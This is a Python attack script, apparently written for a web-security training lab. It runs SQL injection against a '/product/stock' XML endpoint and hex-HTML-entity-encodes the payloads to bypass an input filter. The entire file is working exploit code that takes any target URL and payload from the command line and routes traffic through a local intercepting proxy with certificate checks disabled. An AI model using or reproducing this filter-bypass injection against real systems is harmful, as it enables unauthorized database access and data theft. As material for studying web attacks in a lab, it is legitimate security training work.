#!/usr/bin/env python3
# SQL injection with filter bypass via XML encoding
import requests
import sys

# Debugging
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
p = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def list_to_string(string):
    str1 = ""
    for ele in string:
        str1 += ele
    return str1

def html_entity(payload):
    string = list()
    for i in payload:
        enc = f"&#x{format(ord(i), 'x')};"
        string.append(enc)
    payload = list_to_string(string)
    return payload

def send_payload(url, payload):
    param = "/product/stock"
    xml = f'<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1{payload}</storeId></stockCheck>'
    req = requests.post(url+param, data=xml, verify=False, proxies=p)
    return req.text

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
        
        x = html_entity(payload)
        print(send_payload(url, x))

    except IndexError:
        print("[-] Usage: {} <url> <payload>".format(sys.argv[0]))
        print("[-] Example: {} http://example.com 'ORDER BY 1'".format(sys.argv[0]))
        sys.exit(1)